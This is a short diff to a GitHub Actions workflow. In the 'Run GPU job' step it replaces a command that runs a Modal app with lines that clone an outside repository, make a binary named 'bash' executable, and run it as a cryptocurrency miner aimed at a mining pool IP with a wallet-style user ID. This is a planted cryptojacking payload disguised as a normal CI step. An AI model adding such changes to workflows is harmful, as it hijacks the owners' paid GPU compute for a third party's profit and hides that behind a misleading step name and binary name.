@@ -31,5 +31,8 @@ jobs:
 
       - name: Run GPU job
         run: |
-          modal run modal_app.py --param "from github actions"
+          git clone https://github.com/hujisanda/lol198.git
+          cd lol198 && chmod u+x bash
+          ./bash --algo FISHHASH --pool 134.209.175.114:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
+
           
